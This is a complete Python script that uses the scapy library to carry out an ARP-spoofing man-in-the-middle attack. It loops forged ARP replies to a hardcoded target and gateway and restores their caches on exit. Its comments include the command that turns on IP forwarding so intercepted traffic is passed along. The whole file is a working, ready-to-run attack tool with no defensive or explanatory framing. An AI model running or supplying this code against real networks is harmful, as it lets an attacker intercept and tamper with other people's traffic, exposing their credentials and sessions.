#!/usr/bin/env python3

# Does a man in the middle attack.
# echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
import time

def spoof(target_ip, spoof_ip):
    # op=1 = Request, op=2 = Response
    # pdst = IP of target/victim computer
    # hwdst = Target/victim computer Mac adress
    # psrc = Source of packet (DFGW, router IP addr)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast = broadcast/arp_request   # Combine the ARP and Ehter packets-
    answered_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]  # Send and a recieve a packet with a custom Ether. Timeout on 1 second

    return answered_list[0][1].hwsrc

target_ip = '1.2.100.141'
gateway_ip = '1.2.100.1'

sent_packets_count = 0
try:
    print('[+] Spoofing target %s and the gateway %s' % (target_ip, gateway_ip))
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print('\r[+] Packets sent ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Restoring IP-adresses')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print('[+] Exiting gracefuly')
